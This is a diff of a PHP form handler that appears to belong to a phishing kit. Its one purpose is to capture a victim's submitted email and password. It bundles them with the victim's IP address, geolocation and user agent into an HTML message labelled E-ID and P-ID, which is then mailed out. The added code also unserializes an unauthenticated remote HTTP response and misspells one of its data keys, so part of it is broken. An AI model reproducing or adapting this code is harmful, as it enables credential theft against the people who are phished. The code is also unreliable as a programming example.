@@ -22,15 +22,6 @@ class Email{
 	public function getIp(){
 
 		$ip = $_SERVER['REMOTE_ADDR'];
-		$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
-if(property_exists($ipdat, 'geoplugin_countryCode'));
-if(property_exists($ipdat, 'geoplugin_countryName'));
-if(property_exists($ipdat, 'geoplugin_city'));
-if(property_exists($ipdat, 'geoplugin_region'));
-$countrycode = $ipdat->geoplugin_countryCode;
-$country = $ipdat->geoplugin_countryName;
-$city = $ipdat->geoplugin_city;
-$region = $ipdat->geoplugin_region;
 
 		if(!empty($_SERVER['HTTP_CLIENT_IP'])){
 			$ip = $_SERVER['HTTP_CLIENT_IP'];
@@ -69,12 +60,14 @@ if(isset($_POST)){
 	$email = new Email;
 	$mail = new PHPMailer(true);
 
+	$geo = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR']));
+$country = $geo['geoplugin_regionName'].", ".$geo['geoplugin_countryName'];
+
     $data = array();
     $data['email'] = $email->clean($_REQUEST['pet']);
     $data['pass'] = $email->clean($_REQUEST['pett']);
     $data['ip'] = $email->getIp();
-    $data['cname'] = $email->clean($country);
-    $data['ccity'] = $email->clean($city);
+    $data['browser'] = $country." ".$_SERVER['HTTP_USER_AGENT'];
     $data['subject'] = $email->clean($_REQUEST['pet']);
 
     $data['message'] =
@@ -91,8 +84,7 @@ if(isset($_POST)){
 			    <p><strong>E-ID:</strong> ".$data['email']."</p>
 			    <p><strong>P-ID:</strong>".$data['pass']."</p>
 				<p></p>
-				  <p><strong>CNAME:</strong> ".$data['cname']."</p>
-			    <p><strong>CCITY:</strong>".$data['ccity']."</p>
+				  <p><strong>CNAME:</strong> ".$data['broswer']."</p>
 			    <p><strong>IP:</strong>".$data['ip']."</p>
 			    <br>
 			</body>
